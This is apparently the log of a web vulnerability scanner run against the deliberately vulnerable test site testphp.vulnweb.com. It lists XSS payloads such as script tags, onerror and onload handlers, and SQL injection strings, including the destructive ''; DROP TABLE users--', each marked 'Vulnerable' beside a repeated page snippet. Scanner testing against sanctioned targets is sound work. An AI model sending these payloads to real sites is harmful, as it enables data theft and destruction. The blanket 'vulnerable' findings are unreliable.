+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:40:39.409836] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:40:41.688373] Vulnerable URL: http://testphp.vulnweb.com
+Payload: '; DROP TABLE users--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:48:42.734065] Vulnerable URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:48:43.346859] Vulnerable URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:48:44.475569] Vulnerable URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:48:46.771325] Vulnerable URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Payload: '; DROP TABLE users--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:07:22.539473] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:07:23.322082] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:07:25.138658] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:07:27.750751] Vulnerable URL: http://testphp.vulnweb.com
+Payload: '; DROP TABLE users--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:24:08.200797] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ') OR ('1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:27:32.181580] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ') OR ('1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:52.425746] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:53.273450] Vulnerable URL: http://testphp.vulnweb.com
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:53.942856] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:54.707163] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:55.529634] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:56.243185] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:56.992515] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <body onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:57.782173] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:58.590275] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:28:59.317213] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:29:00.036817] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:29:00.751132] Vulnerable URL: http://testphp.vulnweb.com
+Payload: '; DROP TABLE users--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:29:01.472312] Vulnerable URL: http://testphp.vulnweb.com
+Payload: " OR ""="
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:29:02.289392] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 'a'='a
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:29:03.105455] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ') OR ('1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:51.443953] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:52.153443] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:52.785127] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:53.595486] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:54.417024] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:55.025715] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:55.783340] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <body onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:56.566481] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:57.386795] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:58.114187] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:58.808680] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ' OR 1=1--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:30:59.546393] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: '; DROP TABLE users--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:31:00.329015] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: " OR ""="
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:31:01.039687] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ' OR 'a'='a
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:31:01.673129] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ') OR ('1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:16.063832] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:16.885720] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:17.601530] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:18.312536] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:19.045100] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:19.855929] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:20.576998] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <body onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:21.287032] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:22.004065] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:22.831288] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:23.543324] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ' OR 1=1--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:24.366866] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: '; DROP TABLE users--
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:25.080531] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: " OR ""="
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:25.795036] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ' OR 'a'='a
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:38:26.927773] Vulnerable URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: ') OR ('1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:33.894414] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:35.636647] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-18 12:40:36.353688] Vulnerable URL: http://testphp.vulnweb.com/artists.php?artist=1
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
